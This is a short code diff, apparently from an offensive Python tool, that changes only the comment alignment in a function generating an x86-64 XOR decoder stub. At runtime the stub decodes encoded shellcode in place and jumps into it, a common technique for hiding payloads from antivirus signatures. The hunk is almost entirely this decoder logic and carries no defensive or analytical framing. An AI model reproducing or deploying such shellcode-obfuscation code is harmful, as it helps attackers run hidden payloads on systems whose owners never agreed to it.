@@ -57,15 +57,15 @@ def generate_xor_decoder_stub(encoded_shellcode, key=XOR_KEY):
     """Generates a decoder stub to XOR-decode the shellcode at runtime."""
     decoder_stub = f"""
     ; XOR decoder stub (key: 0x{key:02x})
-    xor    rcx, rcx             ; RCX = 0 (counter)
-    mov    rdx, {len(encoded_shellcode)}  ; RDX = shellcode length
-    lea    rsi, [rel $+7]       ; RSI = address of encoded shellcode
+    xor    rcx, rcx                         ; RCX = 0 (counter)
+    mov    rdx, {len(encoded_shellcode)}    ; RDX = shellcode length
+    lea    rsi, [rel $+7]                   ; RSI = address of encoded shellcode
     decode_loop:
-    xor    byte [rsi + rcx], {hex(key)}  ; Decode byte
-    inc    rcx                  ; Increment counter
-    cmp    rcx, rdx             ; Check if done
-    jne    decode_loop          ; Loop if not
-    jmp    rsi                  ; Jump to decoded shellcode
+    xor    byte [rsi + rcx], {hex(key)}      ; Decode byte
+    inc    rcx                               ; Increment counter
+    cmp    rcx, rdx                          ; Check if done
+    jne    decode_loop                       ; Loop if not
+    jmp    rsi                               ; Jump to decoded shellcode
     """
     return decoder_stub
 
